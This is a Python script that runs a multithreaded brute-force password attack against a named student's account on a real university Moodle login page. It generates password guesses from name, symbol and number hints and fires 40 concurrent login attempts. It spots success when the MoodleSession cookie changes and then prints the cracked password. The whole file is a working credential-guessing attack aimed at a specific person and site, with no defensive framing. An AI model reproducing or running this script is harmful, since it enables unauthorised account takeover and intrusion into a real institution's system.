import requests
import itertools
import time
import threading
from queue import Queue
import sys
import os
#---------------

#Global Variables
url="https://moodle.niituniversity.in/moodle/login/index.php"
user="chowdavarapu.sriker"
timeExe = time.time()
#res = itertools.permutations('srikar1.',8)
arr1=["Your name hints"]   #like ["popoyye","killer","paulwalker"]
arr2=["symbol hints"]  #like ["@",".","","#","$"]
arr3=["Number hints"]  #like["1990","1884","6","0"]
totalCombinations = len(arr1) * len(arr2) * len(arr3)
print("\t\t\t\t\t\t\tUsername - " + str(user))
print("\t\t\t\t\t\t\t\tPortal - Moodle\n")
print("Name hints     - " + str(arr1))
print("Symbol hints   - " + str(arr2))
print("Number hints   - " + str(arr3))
print(" [*] Total number of Combinations - " + str(totalCombinations) + "\n")

#for z in range(100):    # Uncomment this if you want to try all the numbers between any two numbers and keep the range in place of 100
 #   arr3.append(str(z))

res=itertools.product(arr1,arr2,arr3)
#which genates from the above examples arrays- all possible combinations with all given arrays like popoyye@1990 -to- paulwalker$0 

Failscount = 0 

#File Object
f=open("password.txt","w+")

#Queue Object
q = Queue()

#Print_lock
print_lock=threading.Lock()

#Threader Function
def threader():
    while True:
        combination=q.get()
        passwordCracker(combination)
        q.task_done

#passwordCracker Function
def passwordCracker(combination):
    try:
        s=requests.Session()
        r=s.get(url)
        session1=r.cookies["MoodleSession"]
        pas="".join(combination)
        login_data=dict(username=user,password=pas)
        s.post(url,data=login_data)
        session2=s.cookies["MoodleSession"] 
        for fake in range(1):
            if session1!=session2:
                with print_lock:
                    #print("[+] PASSWORD FOUND - " + str(pas))
                    sys.stdout.write("\r \n\n[+] PASSWORD FOUND - " + str(pas))
                    print("\n    Time Executed - " + str(time.time() - timeExe))
                    print("    Password found by " + str(threading.current_thread().name))
                    sys.stdout.flush()
                #sys.stdout.write("\n")
                os._exit(1)
            else:
                global Failscount
                Failscount = Failscount + 1
                with print_lock:
                    sys.stdout.write("\rFails - " + str(Failscount))
                    sys.stdout.write(" [-] not match - " + str(pas))
                    sys.stdout.flush()
                #sys.stdout.write("\n")
                    #print("[-] " + str(pas) + " not Match")
                    if Failscount == totalCombinations:
                        sys.stdout.write("\033[K")
                        sys.stdout.flush()
                        sys.stdout.write("\r\n\n [!] Bruteforce failed.")
                        print("\n\n Time Elapsed - " + str(time.time() - timeExe) + "sec")
                        os._exit(1)
    except Exception as e:
        #print(str(e) + "\n")
        time.sleep(5)
        passwordCracker(combination)

#Creating Threads
for thread in range(40):
    th = threading.Thread(target=threader)
    th.daemon = True
    th.start()

#putting the res values in to the Queue
for eachCombination in res:
    q.put(eachCombination)
q.join()
